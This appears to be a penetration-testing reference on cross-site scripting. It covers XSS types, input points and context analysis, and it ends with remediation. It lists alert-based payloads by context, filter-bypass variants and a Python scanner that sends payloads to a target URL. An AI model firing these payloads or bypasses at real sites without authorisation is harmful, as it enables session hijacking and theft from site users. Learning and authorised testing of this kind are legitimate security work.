# XSS Testing Methodology

## Overview
Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users.

## Types
- **Reflected XSS**: Payload in URL, reflected in response
- **Stored XSS**: Payload stored in database, served to users
- **DOM-based XSS**: Payload executed in client-side JavaScript

## Methodology

### 1. Identify Input Points
- URL parameters
- Form fields
- Headers (User-Agent, Referer)
- Cookies
- JSON/XML body

### 2. Test for Reflection
```
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

### 3. Context Analysis
- **HTML context**: `<div>USER_INPUT</div>`
- **Attribute context**: `<input value="USER_INPUT">`
- **JavaScript context**: `var x = "USER_INPUT";`
- **URL context**: `<a href="USER_INPUT">`

## Payloads by Context

### HTML Context
```
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### Attribute Context
```
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
" onfocus=alert(1) autofocus="
```

### JavaScript Context
```
';alert(1)//
";alert(1)//
</script><script>alert(1)</script>
\'-alert(1)//
```

### Filter Bypass
```
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror=&#x61;lert(1)>
<svg/onload=alert(1)>
```

## Detection Indicators
- Input reflected without encoding
- Script tags or event handlers execute
- Alert/console message appears
- DOM manipulation occurs

## PoC Template
```python
import requests

def test_xss(url, param, payload):
    """Test for reflected XSS."""
    test_url = f"{url}?{param}={payload}"
    response = requests.get(test_url)
    
    if payload in response.text:
        return {
            "vulnerable": True,
            "url": test_url,
            "payload": payload,
            "evidence": "Payload reflected in response"
        }
    return {"vulnerable": False}

# Usage
payloads = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
]

for p in payloads:
    result = test_xss("http://target.com/search", "q", p)
    if result["vulnerable"]:
        print(f"XSS found: {result}")
```

## Impact
- Session hijacking
- Cookie theft
- Keylogging
- Phishing
- Malware distribution

## Remediation
- Output encoding (context-aware)
- Content Security Policy (CSP)
- Input validation
- HTTPOnly cookies
